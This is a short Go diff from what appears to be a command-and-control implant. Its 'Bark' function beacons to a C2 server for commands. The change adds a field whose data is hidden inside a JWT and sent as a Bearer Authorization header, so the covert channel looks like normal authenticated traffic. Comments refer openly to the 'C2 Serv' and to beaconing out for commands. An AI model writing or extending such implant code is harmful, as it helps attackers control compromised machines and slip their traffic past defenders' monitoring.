@@ -33,11 +33,10 @@ type BarkMsg struct {
 	Uri    string
 	Method string
 
-	//Request Data
-	//Headers [][]string - Unsupported in this version.
-	//Cookies [][]string
-
-	Body []byte
+	//Data for the C2 Serv can be in the auth header, or body.
+	//Choose whatever is best for you.
+	AuthHeader []byte
+	Body       []byte
 }
 
 // Beacon out for cmd
@@ -53,6 +52,13 @@ func (barkerconf *BarkConfig) Bark(Msg BarkMsg) ([]byte, error) {
 
 	}
 	request.Header.Set("User-Agent", barkerconf.Ua)
+	if Msg.AuthHeader != nil {
+		authstr, err := BuryinJwt(Msg.AuthHeader)
+		if err != nil {
+			return nil, err
+		}
+		request.Header.Set("Authorization", "Bearer "+authstr)
+	}
 
 	//init client and send request.
 	client := &http.Client{Transport: barkerconf.Tr}
